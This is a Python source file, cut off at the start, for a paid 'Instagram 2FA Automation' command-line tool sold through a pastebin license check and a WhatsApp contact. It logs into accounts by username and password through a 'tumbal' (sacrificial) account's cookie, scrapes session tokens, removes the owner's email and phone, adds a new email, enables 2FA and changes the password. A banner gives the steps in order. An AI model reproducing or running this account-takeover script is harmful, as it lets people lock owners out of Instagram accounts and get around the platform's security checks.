                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'viewport-width': '1358'
            }
            
            self.resp18 = requests.get('https://accountscenter.instagram.com/accounts/', headers=self.headers112).text
            self.namae = list(set(re.findall('"display_name":"(.*?)"', self.resp18)))
            return self.namae
            
        except Exception:
            return []

    def menu(self):
        os.system('clear')
        print('[+] Instagram 2FA Automation')
#        print(f'[+] Your license has {D}{validateUser().file_key()} {W}days left\n')
        
        if not os.path.isfile('tumbal'):
            print('\n[!] Tumbal must be your own account and a new account!.')
            cookie = input('[?] Enter tumbal cookie: ')
            self.infoUser(cookie)
            return
            
        cookie = open('tumbal', 'r').read()
        akunterhubung = self.GetListAkun(cookie)
        self.infoUser(cookie)
        
        if len(akunterhubung) >= 3:
            print(f'[{D}!{W}] Too many accounts {D}remove some first{W}')
            
        print('\n[1] Add account for 2FA')
        print('[2] Activate Instagram 2FA')
        print('[3] Remove Phone/Email and add new')
        print('[4] Remove connected accounts')
        print('[5] Change password')
        print(f'[0] Logout ({D}Change Tumbal{W})\n')
        
        xyz = input('[?] Choose: ')
        
        if xyz == '1':
            print('\n[!] Enter account data to be added')
            username = input('[?] Enter username: ')
            password = input('[?] Enter password: ')
            print('\n[+] Wait for process (few seconds-minutes)')
            login(cookie).main1(username, password)
            
        elif xyz == '2':
            try:
                self.headers3 = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cache-control': 'max-age=0',
                    'cookie': cookie,
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'referer': 'https://accountscenter.instagram.com',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                    'viewport-width': '1358'
                }
                
                self.resp2 = requests.get('https://accountscenter.instagram.com/', headers=self.headers3)
                
                self.flsd = re.search('"LSD",\[\],\{"token":"(.*?)"', self.resp2.text).group(1)
                self.aktorid = re.search('"actorID":"(\\d+)"', self.resp2.text).group(1)
                self.hastesession = re.search('"haste_session":"(.*?)"', self.resp2.text).group(1)
                self.rev = re.search('\{"rev":(\d+)\}', self.resp2.text).group(1)
                self.spinr = re.search('"__spin_r":(\d+)', self.resp2.text).group(1)
                self.spint = re.search('"__spin_t":(\d+)', self.resp2.text).group(1)
                self.dtsg = re.search('"DTSGInitialData",\[\],\{"token":"(.*?)"', self.resp2.text).group(1)
                self.jazo = re.search('jazoest=(\d+)', self.resp2.text).group(1)
                
                self.data40 = {
                    'av': self.aktorid,
                    '__user': '0',
                    '__a': '1',
                    '__req': 'i',
                    '__hs': self.hastesession,
                    'dpr': '1',
                    '__ccg': 'GOOD',
                    '__rev': self.rev,
                    '__s': 'liwoo5:rxplen:w0epet',
                    '__hsi': 'hsi',
                    '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0nK3qazo7u0zEiwaG1LwTwNw4mwr86C1nw4xxW1owLwHwGwbu',
                    '__csr': 'gz6hBMP5ulkLA4thavAaBmSKiFDr4lQDt9LSAyFb_C9aVdbFtamzaGmt35ybKQGFdKCtbrmpBCCKFuVqbHbRSgytqgSGWAF9p4QbV-qmEWitKWmmiV4iJryFJbXGQbQ8niAHBzudyHQ5vAKl4hd3USuUkABCqyXh4iexi00k3WHwOg1to1vKFbGFfAxmGHwPKXCBK0Zo1zh7Bk8wEGhw15-URaEnjjg0OFaGGaGitdalauGwbiE0AO0lAx4bghJ399e1mIK2qt2FEbo332yCIS4IE94Ex7Gp1qq260nGAU4q4ohyE2ugK0rm9qvEs68J4wBga89VFrAAykVEIUyjKqZunK5omLEHwFCKE4uawa5ouxe8www19F6Dw',
                    '__comet_req': '24',
                    'fb_dtsg': self.dtsg,
                    'jazoest': self.jazo,
                    'lsd': self.flsd,
                    '__spin_r': self.spinr,
                    '__spin_b': self.spint,
                    '__spin_t': self.spint,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'FXLinkingFlowDisclosuresRefetchQuery',
                    'variables': json.dumps({
                        "device_id": "device_id_fetch_ig_did",
                        "flow": "IG_WEB_SETTINGS",
                        "selected_age": "null",
                        "used_native_auth_in_vr": False,
                        "web_auth": {
                            "account_type": "INSTAGRAM",
                            "completion_url": {
                                "sensitive_string_value": ""
                            },
                            "web_auth_plain_token": {
                                "sensitive_string_value": "USER_TOKEN"
                            }
                        }
                    }),
                    'server_timestamps': 'true',
                    'doc_id': '8717731548311624'
                }
                
                login(cookie).aktifkan2fa(self.data40)
                
            except Exception as e:
                print(f'[!] Error: {e}')
                
        elif xyz == '3':
            print(f'\n[1] Remove email & phone\n[2] Add email ({D}Previous email will be removed{W})\n')
            dih = input('[?] Choose: ')
            
            if dih == '1':
                login(cookie).GetContactPoint()
            else:
                print(f'\n[1] Random Email {D}Inboxkitten{W}\n[2] Your own email\n')
                self.chs = input('[?] Choose: ')
                
                if self.chs == '2':
                    self.email = input('\n[?] Enter your email: ')
                else:
                    self.email = None
                    
                login(cookie).AddEmail(self.email)
                
        elif xyz == '4':
            login(cookie).GetListAkunAndRemove()
            
        elif xyz == '5':
            self.old = input('\n[?] Current password: ')
            self.new = input('[?] New password: ')
            login(cookie).SangeSandi(self.old, self.new)
            
        elif xyz == '0':
            os.remove('tumbal')
            print('[+] Tumbal removed')


def clear():
    os.system('clear' if 'linux' in sys.platform.lower() else 'cls')


class validateUser:
    def __init__(self):
        pass

    def file_key(self):
        if not os.path.isfile('.kunci'):
            self.buy_key()
            return 0
            
        self.keys = open('.kunci', 'r').read()
        self.sisa = self.durasi(self.keys)
        return self.sisa

    def cek_hash(self, xxx):
        try:
            self.rrq = requests.get('https://pastebin.com/raw/2hXEZff7').text
            self.key = re.findall(xxx + '.*', self.rrq)
            if len(self.key) > 0:
                return False
                
        except (requests.exceptions.ConnectionError, requests.RequestException):
            exit('\n[!] Check your connection')
            
        return True

    def buy_key(self):
        clear()
        self.now = datetime.now()
        self.joined = '%s-%s-%s' % (self.now.day, self.now.month, self.now.year)
        self.random = str(uuid.uuid4()) + str(random.randint(1, 99999)) + str(self.joined)
        self.hashing = hashlib.md5(self.random.encode()).hexdigest()
        self.valid = self.cek_hash(self.hashing)
        
        if self.valid:
            open('.kunci', 'w').write(self.hashing)
            print(f'[+] License: {self.hashing}')
            print('[+] You will be redirected to WhatsApp, wait for author response')
            os.system(f'xdg-open https://wa.me/+6283853140469?text={self.hashing}')
            exit()
        else:
            self.buy_key()

    def durasi(self, xxx):
        try:
            self.rrq = requests.get('https://pastebin.com/raw/2hXEZff7').text
            self.key = re.findall(xxx + '.*', self.rrq)[0].split('|')[1]
            hari, bulan, tahun = self.key.split('-')
            self.sisa = date(int(tahun), int(bulan), int(hari))
            self.ptim = datetime.strptime(str(self.sisa), '%Y-%m-%d')
            self.xtim = self.ptim.date() - date.today()
            
            if self.xtim.days < 1:
                os.remove('.kunci')
                print(f'\n[!] Your license has expired, please renew, your unique code: {xxx}')
                exit()
                
            return self.xtim.days
            
        except IndexError:
            os.remove('.kunci')
            exit('[!] Wrong license')
            
        except Exception as e:
            exit(f'[!] Error: {e}')


def KONTOL3x():
    menuUser().menu()


if __name__ == '__main__':
    clear()
    
    print(f'''
[ STEPS ]

READ SLOWLY SO IT GETS THROUGH

1. Select menu number 1 (Add Account).
   After successfully adding an account, you can activate 2FA (Two-Factor Authentication) 
   and change owner data. {D}DO NOT CHANGE PASSWORD AND 2FA FIRST.{W} Change email/phone data first then 2FA/change password
      
2. When finished removing data or activating 2FA, and want to change accounts,
   make sure to remove previously added accounts to avoid errors.

3. Repeat these steps to activate 2FA or change data if you want to use different accounts.
   For example, if you previously used account A, then want to switch to account B,
   then account B must be added first to the tumbal account.

[ INFORMATION ]

- The system login to the target account cannot use cookies, so must use 
  username and password.
- Checkpoint risk can occur during login. However, after success, all requests
  will use the tumbal account so your main account remains safe.

[ YOUTUBE ]

Step-by-step link: https://www.youtube.com/shorts/118v69F4yl0
''')
    
    input('Press Enter if you understand')
    KONTOL3x()
